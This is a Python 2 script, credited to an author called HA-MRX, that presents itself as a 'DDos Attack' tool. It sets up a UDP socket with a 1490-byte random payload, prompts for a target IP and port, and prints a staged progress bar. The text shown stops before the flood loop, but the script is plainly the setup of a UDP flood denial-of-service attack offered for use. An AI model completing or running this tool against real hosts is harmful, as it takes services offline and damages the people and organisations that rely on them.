import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : HA-MRX"
print "You tube : https://www.youtube.com/c/HA-MRX"
print "github   : https://github.com/Ha3MrX"
print
ip = raw_input("IP Target : ")
port = input("port	 : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[		    ] 0% "
time.sleep(5)
print "[=====		    ] 25%"
time.sleep(5)
print "[==========	    ] 50%"
time.sleep(5)
